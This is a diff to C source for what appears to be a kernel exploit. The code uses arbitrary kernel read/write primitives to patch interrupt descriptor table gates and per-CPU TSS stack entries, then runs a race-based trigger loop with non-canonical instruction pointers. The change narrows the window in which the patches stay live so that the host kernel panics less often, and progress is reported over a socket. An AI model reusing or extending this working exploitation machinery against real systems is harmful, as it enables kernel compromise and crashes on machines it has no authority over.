@@ -4451,30 +4451,32 @@ broad_done:
         send_response(sock, "  IST page PA=0x%lx, DMAP VA=0x%lx, stack top=0x%lx\n",
                       ist_page_pa, ist_dmap_va, ist_stack_top);
 
-        /* 7e. Patch #GP (vec 13) and #SS (vec 12) gates to use IST7.
+        /* 7e. PREPARE #GP (vec 13) and #SS (vec 12) gate info.
          *
-         * Non-canonical RIP during iretq → #GP(0).
-         * Non-canonical RSP during iretq → #SS(0) on AMD, #GP(0) on some.
-         * We patch BOTH gates so either fault vector uses our IST page.
+         * We read and save the current gate values here, but do NOT
+         * write yet.  The actual patches are applied just before the
+         * trigger in Phase 3, and restored immediately after.
+         *
+         * Reason: once IST7 is active, ANY natural #GP/#SS on either
+         * CPU uses our tiny 1-page IST stack, which overflows and
+         * panics the kernel.  We minimise the exposure window.
          */
-        send_response(sock, "\n7e. Configuring IST for #GP and #SS...\n");
+        send_response(sock, "\n7e. Preparing IST patches (deferred)...\n");
+        int gp_needs_patch = 0, ss_needs_patch = 0;
+        int num_cpus_found = 0;
         if (gp_ist_index == 0) {
-            /* #GP gate has no IST — patch it to use IST7 */
-            send_response(sock, "  #GP gate IST=0; patching to IST7\n");
+            send_response(sock, "  #GP gate IST=0; will patch to IST7\n");
             if (kernel_copyout(idt_access + 13 * 16, idt_gate_saved, 16) == 0) {
-                uint8_t new_ist_byte = (idt_gate_saved[4] & 0xF8) | 7;
-                kernel_setchar(idt_access + 13 * 16 + 4, new_ist_byte);
-                idt_gate_modified = 1;
+                gp_needs_patch = 1;
                 gp_ist_index = 7;
-                send_response(sock, "  Patched #GP gate IST: 0 -> 7\n");
             } else {
-                send_response(sock, "  Cannot read #GP gate for patching\n");
+                send_response(sock, "  Cannot read #GP gate\n");
                 goto step7_cleanup;
             }
         } else {
             send_response(sock, "  #GP gate already uses IST%d\n", gp_ist_index);
         }
-        /* Also patch #SS gate (vector 12) to use IST7 */
+        /* Read #SS gate */
         {
             uint8_t ss_gate[16];
             if (kernel_copyout(idt_access + 12 * 16, ss_gate, 16) == 0) {
@@ -4492,10 +4494,8 @@ broad_done:
                               ss_handler, ss_ist, ss_gate[5]);
                 if (ss_ist == 0) {
                     memcpy(ss_gate_saved, ss_gate, 16);
-                    uint8_t new_ss_byte = (ss_gate[4] & 0xF8) | 7;
-                    kernel_setchar(idt_access + 12 * 16 + 4, new_ss_byte);
-                    ss_gate_modified = 1;
-                    send_response(sock, "  Patched #SS gate IST: 0 -> 7\n");
+                    ss_needs_patch = 1;
+                    send_response(sock, "  #SS gate will be patched to IST7\n");
                 } else {
                     send_response(sock, "  #SS gate already uses IST%d\n", ss_ist);
                 }
@@ -4503,12 +4503,9 @@ broad_done:
                 send_response(sock, "  WARNING: cannot read #SS gate\n");
             }
         }
-
-        /* Set the target IST entry on all per-CPU TSSes */
+        /* Count CPUs and save their current IST values */
         {
             int idx = gp_ist_index - 1;
-            send_response(sock, "  Setting IST%d on all CPUs to 0x%lx\n",
-                          gp_ist_index, ist_stack_top);
             for (int cpu = 0; cpu < GP_TRAP_MAX_CPUS && tss_stride > 0; cpu++) {
                 uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
                 uint32_t rsvd0;
@@ -4518,12 +4515,10 @@ broad_done:
                 if (kernel_copyout(cpu_tss + 4, &rsp0, 8) != 0 || rsp0 == 0)
                     break;
                 ist_saved_percpu[cpu][idx] = kernel_getlong(cpu_tss + 0x24 + idx * 8);
-                kernel_setlong(cpu_tss + 0x24 + idx * 8, ist_stack_top);
-                ist_modified_percpu[cpu][idx] = 1;
-                send_response(sock, "  CPU%d TSS 0x%lx: IST%d -> 0x%lx (was 0x%lx)\n",
-                              cpu, cpu_tss, gp_ist_index, ist_stack_top,
-                              ist_saved_percpu[cpu][idx]);
+                num_cpus_found = cpu + 1;
             }
+            send_response(sock, "  Found %d CPUs, IST%d saved (NOT patched yet)\n",
+                          num_cpus_found, gp_ist_index);
         }
 
         /* 7f. Pin to CPU 0 (cascading fallback) */
@@ -4800,9 +4795,37 @@ broad_done:
          * sigsetjmp is inside the loop so we can retry after each
          * signal.  We check both signal mc_rip and IST page RIP.
          */
-        send_response(sock, "\n  WARNING: each attempt with non-canonical RIP risks\n"
+        /* Apply IDT/TSS patches NOW — just before the trigger.
+         * Every microsecond these are active, any natural #GP/#SS
+         * on either CPU overflows our tiny IST stack → panic.
+         * We apply as late as possible and restore immediately after. */
+        send_response(sock, "\n  Applying IDT/TSS patches...\n");
+        if (gp_needs_patch) {
+            uint8_t new_byte = (idt_gate_saved[4] & 0xF8) | 7;
+            kernel_setchar(idt_access + 13 * 16 + 4, new_byte);
+            idt_gate_modified = 1;
+            send_response(sock, "  #GP gate IST -> 7\n");
+        }
+        if (ss_needs_patch) {
+            uint8_t new_byte = (ss_gate_saved[4] & 0xF8) | 7;
+            kernel_setchar(idt_access + 12 * 16 + 4, new_byte);
+            ss_gate_modified = 1;
+            send_response(sock, "  #SS gate IST -> 7\n");
+        }
+        {
+            int idx = gp_ist_index - 1;
+            for (int cpu = 0; cpu < num_cpus_found; cpu++) {
+                uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
+                kernel_setlong(cpu_tss + 0x24 + idx * 8, ist_stack_top);
+                ist_modified_percpu[cpu][idx] = 1;
+                send_response(sock, "  CPU%d IST%d -> 0x%lx\n",
+                              cpu, gp_ist_index, ist_stack_top);
+            }
+        }
+
+        send_response(sock, "\n  WARNING: IDT is now live — each attempt risks\n"
                       "  kernel panic if the CS race loses.\n");
-        send_response(sock, "\n  Starting trigger loop (10 attempts)...\n");
+        send_response(sock, "  Starting trigger loop (10 attempts)...\n");
         {
             int max_attempts = 10;
             gp_trap_attempt_count = 0;
@@ -4938,6 +4961,34 @@ broad_done:
             }
         }
 
+        /* Immediately restore IDT/TSS patches — every microsecond
+         * they stay active risks a panic from any natural #GP/#SS. */
+        send_response(sock, "\n  Restoring IDT/TSS patches...\n");
+        if (idt_gate_modified) {
+            kernel_setchar(idt_access + 13 * 16 + 4, idt_gate_saved[4]);
+            idt_gate_modified = 0;
+            send_response(sock, "  #GP gate IST restored\n");
+        }
+        if (ss_gate_modified) {
+            kernel_setchar(idt_access + 12 * 16 + 4, ss_gate_saved[4]);
+            ss_gate_modified = 0;
+            send_response(sock, "  #SS gate IST restored\n");
+        }
+        {
+            int idx = gp_ist_index - 1;
+            for (int cpu = 0; cpu < num_cpus_found; cpu++) {
+                if (ist_modified_percpu[cpu][idx]) {
+                    uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
+                    kernel_setlong(cpu_tss + 0x24 + idx * 8,
+                                   ist_saved_percpu[cpu][idx]);
+                    ist_modified_percpu[cpu][idx] = 0;
+                    send_response(sock, "  CPU%d IST%d restored\n",
+                                  cpu, gp_ist_index);
+                }
+            }
+        }
+        send_response(sock, "  IDT/TSS restored — safe now\n");
+
         /* 7j. Report result */
         send_response(sock, "\n7j. Result:\n");
         if (gp_trap_got_result && gp_trap_doreti_addr != 0) {
@@ -4979,26 +5030,8 @@ broad_done:
                     writer_started = 0;
                 }
 
-                /* Cleanup per-CPU TSS IST entries */
-                for (int cpu = 0; cpu < GP_TRAP_MAX_CPUS; cpu++) {
-                    for (int i = 0; i < 7; i++) {
-                        if (ist_modified_percpu[cpu][i]) {
-                            uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
-                            kernel_setlong(cpu_tss + 0x24 + i * 8,
-                                           ist_saved_percpu[cpu][i]);
-                            ist_modified_percpu[cpu][i] = 0;
-                        }
-                    }
-                }
-                /* Cleanup IDT gates */
-                if (idt_gate_modified) {
-                    kernel_setchar(idt_access + 13 * 16 + 4, idt_gate_saved[4]);
-                    idt_gate_modified = 0;
-                }
-                if (ss_gate_modified) {
-                    kernel_setchar(idt_access + 12 * 16 + 4, ss_gate_saved[4]);
-                    ss_gate_modified = 0;
-                }
+                /* IDT/TSS already restored after trigger loop */
+
                 /* Restore SIGBUS */
                 if (sigbus_installed) {
                     sigaction(SIGBUS, &old_sigbus_act, NULL);
